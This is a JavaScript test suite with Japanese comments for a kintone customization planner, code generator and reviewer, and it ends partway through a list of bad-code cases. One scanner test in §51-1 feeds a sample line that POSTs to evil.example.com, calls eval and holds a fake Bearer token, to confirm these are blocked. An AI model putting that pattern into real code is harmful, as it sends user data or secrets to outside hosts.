// Customization Planner & JavaScript Generator（Phase 16）: 標準設定と JavaScript を統合した計画の Toolkit 検証 / 生成コードの静的検査 / AI Workspace の統合
//
// 検証内容:
//   §51 Planner（Toolkit 側）: 標準のみ / カスタマイズのみ / Hybrid / 既存 JS への統合 / 新規 JS / 統合先が曖昧 / キャッシュで本文なし / PC・モバイル未定 /
//        存在しないイベント / 既存 JS と同じフィールドを扱う情報（JS_SHARED_FIELD。競合・要確認にしない）/ Generator Context（アプリ全体の facts を送らない）
//   §52 Generator（KTCodeReview）: 新規 JS OK / patch OK / 構文エラー / 未知イベント / 未知フィールド / 計画外のフィールド書き換え / 計画外 API /
//        計画との不一致 / 危険 API / 秘密情報 / 外部通信 / anchor 不明 / baseHash 不一致 / グローバル汚染 / return event なし
//   §53 Chat（C-1 第 3 段・2026-10-08 から新しい流れ: 依頼 → 仮案 → 採用 → 計画 → 生成と検証 → 最終案 → 承認 → 反映）:
//        Hybrid の最終案 / 右の「変更内容」「コード」/ Generator Context / Diff / コピー / 説明 / Q&A は影響なし /
//        複数のカスタマイズ / カスタマイズの修正 / Preview Executor は JS を反映しない / 「これで進めて」はコードを作らない /
//        本文が無いときの JS_SOURCE_UNAVAILABLE（Generator を呼ばない）/ 契約に無い / Gateway エラー
//
// 実行方法: node tests/ai-customization.test.js
'use strict';
process.on('unhandledRejection', (e) => { if (/kintone is not defined/.test(String(e && e.message))) return; console.error(e); process.exit(1); });
const { loadToolkit, makeAssert } = require('./helpers/load-toolkit.js');
//   簡素化（2026-10-17）: 反映できるかは、最新の版なら会話の今の判定、前の版なら最終案の記録で確かめる（tests/helpers/final-state.js）
const FS = require('./helpers/final-state.js');
const { gwHashOfCtx, gwFakeBody } = require('./helpers/gw-hash.js');
const { createNewFlowKit } = require('./helpers/new-flow.js');
const T = loadToolkit();
const { KTDeps, KTScan, KTContext, KTAiClient, KTAiConversation, KTAiChatUi, KTContextUi, KTPlanReview, KTCodeReview, KTJsCatalog, KTPlanExecutor } = T;
const { assert, state } = makeAssert();
const FX = require('./fixtures/ai-context-app.js');
const { buildScanPayload } = require('./helpers/scan-payload.js');
const { makeKintoneMock } = require('./helpers/kintone-preview-mock.js');

// 既存 JS: 承認待ちのとき金額を編集不可にする（E2E の app 346 に登録するものと同じ形）
const FIELD_ON_OFF = [
  "(function () {",
  "  'use strict';",
  "  kintone.events.on(['app.record.create.show', 'app.record.edit.show'], function (event) {",
  "    const record = event.record;",
  "    if (record['ステータス'].value === '承認待ち') {",
  "      record['amount'].disabled = true;",
  "    }",
  "    return event;",
  "  });",
  "})();",
].join('\n');
const FIELD_ON_OFF_FILE = { name: 'fieldOnOff.js', target: 'desktop', kind: 'js', text: FIELD_ON_OFF };

/** 入力（data / deps / scan / incoming）。withFieldOnOff: 既存 JS を足す。sourceText: false なら Scanner のキャッシュ payload（本文なし） */
function buildInputs({ withFieldOnOff = true, sourceText = true } = {}) {
  const data = FX.makeData();
  if (withFieldOnOff) data.customize.desktop.js.push({ type: 'FILE', file: { contentType: 'text/javascript', fileKey: '20261003000000EEEE', name: 'fieldOnOff.js', size: '300' } });
  const fieldsN = KTDeps.normalizeFields(data.fields);
  const deps = KTDeps.buildDependencyData(data, fieldsN);
  const files = withFieldOnOff ? [...FX.files, FIELD_ON_OFF_FILE] : [...FX.files];
  const fieldRows = fieldsN.map(f => ({ code: f.code, label: f.label, type: f.rawType }));
  const scan = buildScanPayload({ KTScan, KTDeps }, { appId: FX.SELF_APP, files, fields: fieldRows, deps, skippedUrlFiles: FX.skippedUrlFiles });
  scan.results = KTScan.analyze({ fields: fieldRows, files: files.filter(f => f.kind === 'js'), snippet: { before: 24, after: 48 } });   // 実スキャナの access 分類（.disabled = → CONTROL）
  if (!sourceText) scan.files = scan.files.map(f => ({ name: f.name, target: f.target, kind: f.kind, ...(f.note ? { note: f.note } : {}) }));
  KTDeps.mergeScannerEdges(deps, scan);
  KTDeps.applyIncomingRefs(deps, FX.incoming);
  return { data, deps, scan, incoming: FX.incoming };
}
const INPUTS = buildInputs();
const INPUTS_PLAIN = buildInputs({ withFieldOnOff: false });
const INPUTS_CACHED = buildInputs({ sourceText: false });

const GOAL_HYBRID = '100万円以上なら部長承認にして、承認後は金額を編集できなくしたい';
const spec = (o) => ({ name: null, from: null, to: null, filterCond: null, assignees: [], targets: [], events: [], timingField: null, daysLater: null, time: null, fields: [], sort: null, sourceApp: null, keyField: null, mappings: [], fieldType: null, required: null, options: [], destApp: null, accessibility: null, entities: [], customizationId: null, ...o });
const mkStep = (id, actionType, targetKind, targetRef, sp, extra = {}) => ({ id, actionType, targetKind, targetRef, targetExists: null, title: `${id} ${actionType}`, proposal: { summary: '', details: [] }, spec: spec(sp), dependsOn: [], reason: '', evidenceIds: [], confidence: 'INFERRED', alternativeId: null, validation: { status: 'ok', issues: [] }, execution: { mode: 'PLAN_ONLY', supported: false, reason: 'x' }, ...extra });
const META = { requestId: 'pl-h1', gateway: { product: 'toolkit', feature: 'change-planner', promptVersion: '1', contextVersion: 'planner-1' }, normalization: { warnings: [] }, ai: { model: 'm' }, usage: { usedThisMonth: 1, monthlyLimit: 20 } };
const cust = (o = {}) => ({ customizationId: 'C1', requirement: '承認後（完了）は金額を編集できなくする', whyStandardInsufficient: 'フィールドのアクセス権はステータスで切り替えられない', strategy: 'EXTEND_EXISTING_JS', platform: ['desktop'], events: ['app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], existingFiles: [{ name: 'fieldOnOff.js', target: 'desktop', reason: '同じフィールド（金額）を制御している' }], risks: [], questions: [], dependsOn: [], evidenceIds: [], ...o });
const STD_STEP = () => mkStep('P1', 'ADD_VIEW', 'VIEW', '承認済み', { name: '承認済み', fields: ['case_name', 'amount', 'approver'], filterCond: 'ステータス in ("完了")', sort: 'due_date asc' }, { title: '一覧「承認済み」を追加', solution: 'STANDARD' });
const JS_STEP = (cid = 'C1', extra = {}) => mkStep('P2', 'CUSTOMIZATION_REQUIRED', 'JS', 'fieldOnOff.js', { customizationId: cid }, { title: '承認後は金額を編集できなくする（JavaScript）', solution: 'CUSTOMIZATION', ...extra });
const planOf = ({ steps, customizations = [], solution = null, goal = GOAL_HYBRID, questions = [], requestId = 'pl-h1' }) => ({
  ok: true, contractVersion: '2.1', meta: { ...META, requestId },
  plan: { goal, ...(solution ? { solution } : {}), assessment: { summary: '承認フローは標準のプロセス管理、承認後のロックは JavaScript が必要です。', usableExistingFields: [], usableExistingSettings: [], missingCapabilities: [], uncertainties: [] }, relevantFields: [], proposedFields: [], steps, customizations, alternatives: [], impact: [], questions, unknowns: [], planConfidence: 'INFERRED' },
});
const PLAN_HYBRID = planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust()], solution: 'HYBRID' });
const PLAN_STD = planOf({ steps: [STD_STEP()], solution: 'STANDARD', goal: '承認済みの一覧を追加したい' });
const PLAN_JS_ONLY = planOf({ steps: [JS_STEP()], customizations: [cust()], solution: 'CUSTOMIZATION', goal: '承認後は金額を編集できなくしたい' });
const NEW_JS_CUST = () => cust({ customizationId: 'C1', requirement: '金額が100万円以上なら警告メッセージを表示する', whyStandardInsufficient: '入力中の値に応じたメッセージ表示は標準設定にない', strategy: 'NEW_JS_FILE', platform: ['desktop'], events: ['app.record.create.change.amount', 'app.record.edit.change.amount'], fields: [{ code: 'amount', access: 'CONTROL' }], existingFiles: [] });
const PLAN_NEW_JS = planOf({ steps: [JS_STEP('C1', { title: '金額が100万円以上なら警告メッセージを表示（JavaScript）', targetRef: null })], customizations: [NEW_JS_CUST()], solution: 'CUSTOMIZATION', goal: '金額が100万円以上なら警告メッセージを表示したい' });

/** Planner Context → client 側の validatePlan（会話経路と同じ）→ KTPlanReview.review */
function reviewPlan(resp, inputs = INPUTS) {
  const gen = KTContextUi.generatePlan({ goal: resp.plan.goal, inputs });
  const v = KTAiClient.validatePlan(resp, gen.ctx);
  if (!v.ok) throw new Error(`validatePlan failed: ${JSON.stringify(v.errors)}`);
  const plan = { ...v.normalized, requestId: resp.meta.requestId };
  const review = KTPlanReview.review({ plan, ...inputs });
  return { plan, review, ctx: gen.ctx, jsReview: (review.steps || []).find(r => r.solution === 'CUSTOMIZATION') || null };
}
const hash = (t) => KTScan.hashText(t);
const NEW_JS_GOOD = [
  "(function () {",
  "  'use strict';",
  "  kintone.events.on(['app.record.create.change.amount', 'app.record.edit.change.amount'], function (event) {",
  "    const record = event.record;",
  "    const amount = Number(record['amount'].value || 0);",
  "    record['amount'].error = amount >= 1000000 ? '100万円以上は部長の承認が必要です' : null;",
  "    return event;",
  "  });",
  "})();",
].join('\n');
const PATCH_GOOD = {
  baseHash: hash(FIELD_ON_OFF),
  operations: [{ type: 'INSERT_AFTER', anchor: "      record['amount'].disabled = true;\n    }", content: "    if (record['ステータス'] && record['ステータス'].value === '完了') {\n      record['amount'].disabled = true;\n    }" }],
};
const PATCH_ADDED = PATCH_GOOD.operations[0].content;
/** Gateway の応答（generated）。validateGenerated を通して会話経路と同じ形にする */
const genResponse = (ctx, g) => ({ ok: true, contractVersion: '2.1', meta: { requestId: 'gen-1', usage: { usedThisMonth: 3, monthlyLimit: 20 }, normalization: { warnings: [] }, gateway: { feature: 'customization-generator' } }, generated: { strategy: ctx.customization.strategy, targetFile: ctx.existingFile?.name || 'amountWarning.js', summary: ctx.customization.requirement, events: ctx.customization.events, fields: ctx.customization.fields, apis: [], assumptions: [], warnings: [], gatewayChecks: { security: [] }, ...g } });
const genNew = (code = NEW_JS_GOOD, g = {}) => ({ strategy: 'NEW_JS_FILE', targetFile: 'amountWarning.js', summary: '金額の警告', code, patch: null, events: ['app.record.create.change.amount', 'app.record.edit.change.amount'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], assumptions: [], warnings: [], ...g });
//   2026-10-18（AI版 契約 20 §20）: 統合の書き込む本文は生成工程が合成して返す generated.body（Toolkit は合成しない）。偽の生成工程の本文は gwFakeBody（テストの部品）
const genPatch = (patch = PATCH_GOOD, g = {}, src = FIELD_ON_OFF) => ({ strategy: 'EXTEND_EXISTING_JS', targetFile: 'fieldOnOff.js', summary: '完了でも金額を編集不可にする', code: patch.operations.map(o => o.content).join('\n'), patch, body: gwFakeBody(src, patch), events: ['app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], assumptions: [], warnings: [], ...g });
const check = (rv, name) => (rv.checks || []).find(c => c.name === name) || null;
const SRC = { name: 'fieldOnOff.js', target: 'desktop', text: FIELD_ON_OFF };
const tick = () => new Promise(r => setTimeout(r, 0));
const ticks = async (n = 4) => { for (let i = 0; i < n; i++) await tick(); };

(async () => {
// =========================================================
console.log('\n--- §51-1. KTJsCatalog（決定的な Event / API Catalog）---');
{
  assert(KTJsCatalog.checkEvent('app.record.edit.show').ok && KTJsCatalog.checkEvent('mobile.app.record.create.show').ok, 'Event Catalog: 既知のイベント');
  const bad = KTJsCatalog.checkEvent('app.record.update.show');
  assert(bad.ok === false, 'Event Catalog: app.record.update.show は存在しない（計画・コードの両方で拒否する根拠）');
  const ch = KTJsCatalog.checkEvent('app.record.create.change.amount', { fields: ['amount'] });
  assert(ch.ok && ch.field === 'amount' && KTJsCatalog.checkEvent('app.record.create.change.nope', { fields: ['amount'] }).ok === false, 'change イベントはフィールドの実在を確認する');
  assert(KTJsCatalog.eventPlatform('mobile.app.record.edit.show') === 'mobile' && KTJsCatalog.eventPlatform('app.record.edit.show') === 'desktop', 'イベントの platform');
  const sec = KTJsCatalog.scanSecurity("fetch('https://evil.example.com/x', { method: 'POST', body: '1' }); eval('1'); const h = { Authorization: 'Bearer abcdefghijklmnop1234' };");
  assert(sec.some(x => x.severity === 'block') && sec.length >= 3, `Security rules: 外部 POST / eval / Authorization を検出（${sec.length} 件）`);
}

// =========================================================
console.log('\n--- §51-2. Toolkit Review: 標準のみ / カスタマイズのみ / Hybrid ---');
{
  const std = reviewPlan(PLAN_STD);
  assert(std.plan.solution === 'STANDARD' && std.plan.customizations.length === 0 && std.review.hybrid.solution === 'STANDARD' && std.review.summary.counts.customizations === 0, '標準のみ: solution STANDARD・customizations なし');
  const js = reviewPlan(PLAN_JS_ONLY);
  assert(js.plan.solution === 'CUSTOMIZATION' && js.review.hybrid.solution === 'CUSTOMIZATION' && js.review.hybrid.standard.steps.length === 0 && js.review.hybrid.customization.steps.length === 1, 'カスタマイズのみ: solution CUSTOMIZATION');
  const hy = reviewPlan(PLAN_HYBRID);
  assert(hy.plan.solution === 'HYBRID' && hy.review.hybrid.solution === 'HYBRID' && hy.review.hybrid.standard.steps.includes('P1') && hy.review.hybrid.customization.steps.includes('P2'), 'Hybrid: 標準設定 P1 ＋ JavaScript P2 を同じ Review 上で分けて要約');
  assert(hy.jsReview && hy.jsReview.solution === 'CUSTOMIZATION' && hy.jsReview.safety === 'PLAN_ONLY' && hy.jsReview.customization.customizationId === 'C1', 'JS の step は PLAN_ONLY（Executor は反映しない）・customization を保持');
  assert(hy.jsReview.codeGeneration.supported === true && hy.jsReview.codeGeneration.strategy === 'EXTEND_EXISTING_JS' && hy.jsReview.codeGeneration.existingFile?.name === 'fieldOnOff.js' && hy.jsReview.codeGeneration.sourceAvailable === true, '既存 JS への統合: 統合先 fieldOnOff.js を解決・本文あり・コード生成可');
  assert(hy.review.executionReadiness.generatableSteps.includes('P2') && hy.review.hybrid.customization.generatable.includes('P2'), 'executionReadiness.generatableSteps に P2');
  assert(hy.review.executionReadiness.planOnlySteps.includes('P2') && !hy.review.executionReadiness.safeSteps.includes('P2'), 'JS は safeSteps に入らない（Executor の対象外）');
  const out = KTPlanReview.executorOutput(hy.plan, hy.review, ['P1', 'P2']);
  const cls = KTPlanExecutor.classifySteps(out);
  assert(cls.find(x => x.stepId === 'P2')?.status === 'UNSUPPORTED' && cls.find(x => x.stepId === 'P1')?.status === 'PENDING', 'Executor の分類: P1 は PENDING（実行可）・JS の P2 は UNSUPPORTED（反映しない）');
  assert(out.plan.solution === 'HYBRID' && out.plan.customizations?.length === 1 && out.review.hybrid?.customization?.steps?.includes('P2'), 'executorOutput に solution / customizations / hybrid が残る（監査 JSON）');
  // 新規 JS
  const nw = reviewPlan(PLAN_NEW_JS);
  assert(nw.jsReview.codeGeneration.supported === true && nw.jsReview.codeGeneration.strategy === 'NEW_JS_FILE' && nw.jsReview.codeGeneration.existingFile === null, '新規 JS: NEW_JS_FILE でコード生成可');
  //   簡素化 §5（2026-10-16）: 既存 JS と同じフィールドを扱うだけでは競合と確定せず、確認も求めない（以前の期待は JS_FIELD_CONFLICT の medium で NEEDS_CONFIRMATION・
  //   「新しいファイルを足す前に既存処理への統合を検討してください」）。一緒の動きは生成工程の動作テスト（同じ画面の既存 JS を送る）が確かめる
  const sh = nw.jsReview.issues.find(i => i.code === 'JS_SHARED_FIELD' && i.file === 'fieldOnOff.js');
  assert(sh && sh.severity === 'low' && /amount（CONTROL）/.test(sh.message) && /生成工程の動作テストで確かめます/.test(sh.message) && !/新しいファイルを足す前に/.test(sh.message) && !nw.jsReview.issues.some(i => i.severity === 'medium' && /fieldOnOff\.js/.test(i.message)) && nw.jsReview.status !== 'NEEDS_CONFIRMATION' && !nw.review.hybrid.customization.conflicts.includes('P2') && !nw.review.hybrid.customization.needsConfirmation.includes('P2'),
    `既存 JS（fieldOnOff.js）が同じ amount を CONTROL → 同じフィールドを扱う情報（JS_SHARED_FIELD・low）。競合・要確認にはしない: ${JSON.stringify({ status: nw.jsReview.status, issue: sh })}`);
  const nwPlain = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  assert(!nwPlain.jsReview.issues.some(i => i.code === 'JS_SHARED_FIELD') && nwPlain.jsReview.status === 'VALID', '同じフィールドを扱う既存 JS が無ければ競合なし（VALID）');
}

// =========================================================
console.log('\n--- §51-3. Toolkit Review: 統合先が曖昧 / 本文なし / PC・モバイル未定 / 未知イベント / 理由なし ---');
{
  const ambiguous = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ existingFiles: [] })] }));
  assert(ambiguous.jsReview.issues.some(i => i.code === 'JS_TARGET_FILE_MISSING') && ambiguous.jsReview.codeGeneration.supported === false && ambiguous.jsReview.codeGeneration.reason === 'TARGET_FILE_MISSING', '統合先が曖昧（existingFiles なし）: JS_TARGET_FILE_MISSING・生成不可');
  const notFound = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ existingFiles: [{ name: 'ghost.js', target: 'desktop', reason: '' }] })] }));
  assert(notFound.jsReview.status === 'INVALID' && notFound.jsReview.issues.some(i => i.code === 'JS_TARGET_FILE_NOT_FOUND'), '登録されていないファイルへの統合: INVALID（実行不可）');
  const cached = reviewPlan(PLAN_HYBRID, INPUTS_CACHED);
  assert(cached.jsReview.codeGeneration.sourceAvailable === false && cached.jsReview.issues.some(i => i.code === 'JS_SOURCE_UNAVAILABLE') && cached.jsReview.codeGeneration.supported === true, 'キャッシュ payload（本文なし）: JS_SOURCE_UNAVAILABLE（低）。生成時に取得を試みる');
  const noPlatform = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ platform: [] })] }));
  assert(noPlatform.jsReview.issues.some(i => i.code === 'JS_PLATFORM_UNSPECIFIED') && noPlatform.jsReview.codeGeneration.supported === false && noPlatform.jsReview.codeGeneration.reason === 'PLATFORM_UNSPECIFIED' && noPlatform.jsReview.status === 'NEEDS_CONFIRMATION', 'PC / モバイル未定: 確認が必要・生成不可（勝手に desktop にしない）');
  const badEvent = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ events: ['app.record.update.show'] })] }));
  assert(badEvent.jsReview.status === 'INVALID' && badEvent.jsReview.issues.some(i => i.code === 'JS_EVENT_UNKNOWN') && badEvent.jsReview.codeGeneration.supported === false, '存在しないイベント app.record.update.show: INVALID');
  const noReason = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ whyStandardInsufficient: '' })] }));
  assert(noReason.jsReview.issues.some(i => i.code === 'JS_REASON_MISSING') && noReason.jsReview.status === 'NEEDS_CONFIRMATION', '標準設定で不足する理由が無い: 確認が必要');
  const wrongScreen = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ events: ['app.record.detail.show'] })] }));
  assert(wrongScreen.jsReview.issues.some(i => i.code === 'JS_SCREEN_MISMATCH'), 'CONTROL するのに詳細画面のイベントだけ: JS_SCREEN_MISMATCH');
  const unknownField = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ fields: [{ code: 'amount', access: 'CONTROL' }, { code: 'nope_field', access: 'READ' }] })] }));
  assert(unknownField.jsReview.status === 'INVALID' && unknownField.jsReview.issues.some(i => i.code === 'JS_FIELD_UNKNOWN'), '存在しないフィールドを計画に含む: INVALID');
  const missing = reviewPlan(planOf({ steps: [JS_STEP('C9')], customizations: [cust()] }));
  assert(missing.jsReview.status === 'INVALID' && missing.jsReview.issues.some(i => i.code === 'CUSTOMIZATION_NOT_FOUND'), 'step が指す customization が無い: INVALID');
  // 実機（Scenario A 2 回目）: 依存する標準設定（新しいステータス等）が無効 → JS は BLOCKED_BY_DEPENDENCY で生成不可（存在しない設定名を前提にしたコードを作らない）
  const depBad = reviewPlan(planOf({ steps: [mkStep('P1', 'ADD_FIELD', 'PROPOSED_FIELD', 'NEW_FIELD_9', { fieldType: 'DROP_DOWN', options: ['a'] }, { title: '提案に無い新規フィールド' }), JS_STEP('C1', { dependsOn: ['P1'] })], customizations: [cust({ dependsOn: ['P1'] })], solution: 'HYBRID' }));
  assert(depBad.jsReview.status === 'BLOCKED_BY_DEPENDENCY' && depBad.jsReview.codeGeneration.supported === false && depBad.jsReview.codeGeneration.reason === 'BLOCKED_BY_DEPENDENCY' && depBad.review.hybrid.customization.blocked.includes('P2') && !depBad.review.hybrid.customization.generatable.includes('P2'), '依存する標準設定が無効: JS は BLOCKED_BY_DEPENDENCY・生成不可（generatable に入らない）');
  assert(/Toolkit ではコードを作れません（前提の標準設定が無効）/.test(KTAiChatUi.changeSummaryHtml({ plan: depBad.plan, review: depBad.review })), '右の「変更内容」の「反映できないこと」: 生成できない理由を日本語で（2026-10-19: 確認結果のタブは廃止）');
  //   簡素化（2026-10-17）: 要件の文の語（「警告」「編集不可」など）で CONTROL の不足を指摘する注意（JS_ACCESS_HINT）は削除した（要件の文を Toolkit が読み直さない）
  // validatePlan（client）: customizations の正規化と solution の導出
  const gen = KTContextUi.generatePlan({ goal: GOAL_HYBRID, inputs: INPUTS });
  const v = KTAiClient.validatePlan(planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust({ platform: ['desktop', 'tablet'], fields: [{ code: 'amount', access: 'ADMIN' }], evidenceIds: ['E999'] })] }), gen.ctx);
  assert(v.ok && v.normalized.solution === 'HYBRID' && v.normalized.customizations[0].platform.join() === 'desktop' && v.normalized.customizations[0].fields[0].access === 'READ' && v.normalized.customizations[0].evidenceIds.length === 0 && v.warnings.some(w => w.code === 'UNKNOWN_EVIDENCE_REMOVED') && !v.warnings.some(w => w.code === 'CUSTOMIZATION_ACCESS_ADJUSTED'), 'validatePlan: platform / access の語彙外を落とし（語彙外の access は READ。要件の文の語で CONTROL にする正規化は Gateway の validate-plan だけ）、未知の根拠ID を除去、solution を導出');
  //   簡素化（2026-10-17）: 「PC とモバイル両方で必要か」を質問しながら両方を platform に入れたときに空にする正規化は、Gateway の validate-plan だけが行う
  const vq = KTAiClient.validatePlan(planOf({ steps: [JS_STEP()], customizations: [{ ...NEW_JS_CUST(), platform: ['desktop', 'mobile'], questions: ['PCとモバイル両方で必要か？'] }] }), gen.ctx);
  assert(vq.ok && vq.normalized.customizations[0].platform.join() === 'desktop,mobile' && !vq.warnings.some(w => w.code === 'CUSTOMIZATION_PLATFORM_QUESTIONED'), 'validatePlan: Gateway の正規化（質問しながら両方なら空にする）をやり直さない');
}

// =========================================================
console.log('\n--- §51-4. Planner Context の js-file facts と Generator Context ---');
{
  const gen = KTContextUi.generatePlan({ goal: GOAL_HYBRID, inputs: INPUTS });
  const jsFacts = gen.ctx.facts.filter(f => f.kind === 'js-file');
  assert(jsFacts.length >= 1 && jsFacts.some(f => /fieldOnOff\.js/.test(f.statement) && /amount/.test(f.statement)), `Planner Context: js-file facts に fieldOnOff.js（amount を制御）がある（${jsFacts.length} 件）`);
  assert(Array.isArray(gen.ctx.dictionary.jsFiles) && gen.ctx.dictionary.jsFiles.some(x => /fieldOnOff\.js/.test(x)), 'dictionary.jsFiles に登録済み JS');
  const hy = reviewPlan(PLAN_HYBRID);
  const c = hy.plan.customizations[0];
  const gctx = KTContext.buildGenerator({ customization: c, plan: hy.plan, planId: 'plan-1', version: 1, data: INPUTS.data, deps: INPUTS.deps, scan: INPUTS.scan, existingSource: SRC });
  assert(gctx.contextVersion === KTContext.GENERATOR_CONTEXT_VERSION && gctx.customization.customizationId === 'C1' && gctx.customization.strategy === 'EXTEND_EXISTING_JS', 'Generator Context: contextVersion customization-1・承認済み customization');
  assert(gctx.facts === undefined && !('retrieval' in gctx) && gctx.fields.length <= 4 && gctx.fields.some(f => f.code === 'amount') && gctx.fields.some(f => f.type === 'STATUS'), 'アプリ全体の facts は送らない。関係するフィールド（amount）＋ ステータスだけ');
  assert(gctx.existingFile && gctx.existingFile.hash === hash(FIELD_ON_OFF) && gctx.existingFile.source === FIELD_ON_OFF && gctx.existingFile.analysis.events.includes('app.record.edit.show') && gctx.existingFile.analysis.fields.some(f => f.code === 'amount'), '統合先の本文・指紋（baseHash）・解析（イベント / フィールド）を渡す');
  assert(gctx.otherFiles.every(f => f.name !== 'fieldOnOff.js') && gctx.otherFiles.some(f => f.name === 'common.js'), '他の JS は要約だけ（統合先は除く）');
  assert(gctx.dictionary.fieldCodes.includes('amount') && gctx.dictionary.statuses.includes('承認待ち') && gctx.constraints.noNetwork === true && gctx.constraints.patchOnly === true && gctx.plan.standardSteps.some(s => s.id === 'P1'), 'dictionary（フィールドコード・ステータス名）・制約（通信なし・patch のみ）・関係する標準設定の step');
  const env = KTAiClient.buildGenerateEnvelope({ ctx: gctx, requestId: 'r1' });
  assert(env.meta.feature === KTAiClient.FEATURE_GENERATOR && env.meta.feature === 'customization-generator' && env.meta.contextVersion === 'customization-1' && env.payload === gctx, 'envelope: feature customization-generator（Planner と別 feature）');
  let threw = null; try { KTAiClient.buildGenerateEnvelope({ ctx: { contextVersion: 'x' } }); } catch (e) { threw = e; }
  assert(threw && threw.code === KTAiClient.ERROR_CODES.NO_CONTEXT, 'customization の無い ctx は送れない');
  const vg = KTAiClient.validateGenerated(genResponse(gctx, genPatch()), gctx);
  assert(vg.ok && vg.normalized.strategy === 'EXTEND_EXISTING_JS' && vg.normalized.patch?.operations?.length === 1 && vg.normalized.requestId === 'gen-1', 'validateGenerated: strategy / code / patch を正規化');
  const vgBad = KTAiClient.validateGenerated(genResponse(gctx, genPatch(PATCH_GOOD, { patch: null })), gctx);
  assert(!vgBad.ok && vgBad.errors[0].code === KTAiClient.ERROR_CODES.INVALID_RESPONSE, 'EXTEND_EXISTING_JS なのに patch が無い応答は拒否');
  const vgMis = KTAiClient.validateGenerated(genResponse(gctx, genNew()), gctx);
  assert(vgMis.ok && vgMis.warnings.some(w => w.code === 'STRATEGY_MISMATCH'), '方針が計画と違えば warning（Toolkit Code Review が計画との照合を行う）');
}

// =========================================================
console.log('\n--- §52-1. KTCodeReview: 新規 JS OK / patch OK ---');
{
  const nw = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  const prov = { planId: 'plan-1', planVersion: 1, customizationId: 'C1', generatedAt: '2026-10-03T00:00:00.000Z', appId: '310', requestId: 'gen-1' };
  const rv = KTCodeReview.review({ generated: genNew(), customization: nw.plan.customizations[0], plan: nw.plan, data: INPUTS_PLAIN.data, scan: INPUTS_PLAIN.scan, existingSource: null, provenance: prov });
  assert(rv.status === 'OK', `新規 JS（妥当）: status OK（${(rv.checks || []).filter(c => !c.ok).map(c => `${c.name}: ${c.message}`).join(' / ') || 'すべて ✓'}）`);
  assert(!['syntax', 'events', 'fields', 'security', 'globals', 'return-event', 'plan-consistency'].some(n => check(rv, n)), 'チェック項目（簡素化 B）: 候補の検査（構文・イベント・フィールド・安全・return event・計画との一致）は生成工程。Toolkit の形式確認は作り直さない');
  assert(rv.finalCode === NEW_JS_GOOD && rv.diff && rv.diff.added === NEW_JS_GOOD.split('\n').length && rv.diff.removed === 0, '新規 JS: finalCode ＝ 全文・diff は全行追加');
  assert(rv.rescan && rv.rescan.events.map(e => e.name).includes('app.record.create.change.amount') && rv.rescan.fieldAccess.amount && rv.rescan.fieldAccess.amount.CONTROL, 'KTScan の再解析（仮想ファイル）: イベント・amount CONTROL');
  assert(rv.provenance && rv.provenance.planId === 'plan-1' && rv.provenance.customizationId === 'C1' && rv.provenance.codeHash === hash(NEW_JS_GOOD) && rv.provenance.reviewedAt, 'provenance（計画・版・customization・requestId・コードの指紋）');
  // 既存 JS への patch
  const hy = reviewPlan(PLAN_HYBRID);
  const rp = KTCodeReview.review({ generated: genPatch(), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: SRC });
  assert(rp.status === 'OK', `既存 JS への patch（妥当）: status OK（${(rp.checks || []).filter(c => !c.ok).map(c => `${c.name}: ${c.message}`).join(' / ') || 'すべて ✓'}）`);
  assert(check(rp, 'patch')?.ok && rp.diff.added === 3 && rp.diff.removed === 0 && rp.finalCode.includes(FIELD_ON_OFF.split('\n')[2]) && rp.finalCode.includes("value === '完了'"), 'patch: 既存の行は保持（削除 0）・3 行追加・最終コードは既存 ＋ 追加');
  assert(!check(rp, 'handler'), '既存 handler の中へ追加: 登録の形（handler）は Toolkit では判定しない（簡素化 B。生成工程の検査）');
  assert(rp.finalCode === genPatch().body && typeof rp.diffText === 'string' && /\+\s*if \(record\['ステータス'\] && record\['ステータス'\]\.value === '完了'\)/.test(rp.diffText), '書き込む本文は生成工程の本文そのもの（Toolkit は合成し直さない）と Before / After の diff テキスト');
  assert(!check(rp, 'duplicate-handler') || check(rp, 'duplicate-handler').ok, '重複 handler なし');
}

// =========================================================
console.log('\n--- §52-2. KTCodeReview: 構文 / 未知イベント / 未知フィールド / 計画外 / API / 危険 / 秘密 / 外部通信 / patch 失敗 / 作法 ---');
{
  const nw = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  const c = nw.plan.customizations[0];
  const run = (code, g = {}) => KTCodeReview.review({ generated: genNew(code, g), customization: c, plan: nw.plan, data: INPUTS_PLAIN.data, scan: INPUTS_PLAIN.scan, existingSource: null });
  //   簡素化 B（2026-10-17）: 生成した候補の検査（構文・記法・イベント・フィールド・計画との一致・通信 API・秘密情報と危険な呼び出し・return event）は
  //   生成工程（Gateway）の機械検査が正本（AI版 worker/src/v2/toolkit/verify-generated.mjs の machineChecks。本物の部品で確かめるのは AI版 worker のテスト
  //   （customization-generator.mjs・required-effects.mjs）と sandbox/test/cross-toolkit.mjs）。Toolkit の形式確認はこれらを作り直さない
  //   （以前の期待: Toolkit の syntax・events・fields・target-fields・apis-network・planned-events・security・globals・return-event・duplicate-handler で止める・確認にする）。
  //   即時関数で包まない宣言（globals）と同じイベントの 2 回の登録（duplicate-handler）は生成工程にも同じ規則が無く、移植していない（判定しない範囲として残る）
  const BAD = {
    syntax: NEW_JS_GOOD.replace('return event;', 'return event'.slice(0, 6) + ' event event;'),
    unknownEvent: NEW_JS_GOOD.replace("'app.record.edit.change.amount'", "'app.record.update.show'"),
    unknownField: NEW_JS_GOOD.replace("record['amount'].value", "record['amount_total'].value"),
    extraWrite: NEW_JS_GOOD.replace("})();", "  kintone.events.on(['app.record.create.show'], function (event) {\n    event.record['approver'].value = [];\n    return event;\n  });\n})();"),
